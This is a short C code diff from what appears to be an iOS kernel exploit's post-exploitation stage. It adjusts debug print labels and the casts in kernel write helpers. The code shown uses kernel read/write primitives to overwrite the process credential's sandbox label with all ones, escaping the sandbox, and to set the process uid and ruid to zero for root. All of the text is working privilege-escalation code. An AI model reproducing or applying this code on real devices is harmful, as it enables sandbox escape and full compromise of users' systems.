@@ -39,10 +39,10 @@ void postExploit(void) {
     uint64_t label = kread64(ucred + off_u_cr_label);
     printf("label: 0x%llx\n", label);
     printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
-    printf("sandbox: %u\n", kread64(label + 0x10));
+    printf("sandbox 1: %u\n", kread64(label + 0x10));
     //Escape Sandbox
     kwrite64(label + 0x10, 0xffffffffffffffff);
-    printf("sandbox: %u\n", kread64(label + 0x10));
+    printf("sandbox 2: %u\n", kread64(label + 0x10));
     //Get Root
     kwrite32(proc + off_p_uid, 0);
     kwrite32(proc + off_p_ruid, 0);
@@ -89,11 +89,11 @@ void kwrite32(uint64_t where, uint32_t what) {
     u32 _buf[2] = {};
     _buf[0] = what;
     _buf[1] = kread32(where+4);
-    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
+    kwrite(_kfd, &_buf, where, sizeof(uint64_t));
 }
 
 void kwrite64(uint64_t where, uint64_t what) {
     u64 _buf[1] = {};
     _buf[0] = what;
-    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
+    kwrite(_kfd, &_buf, where, sizeof(uint64_t));
 }
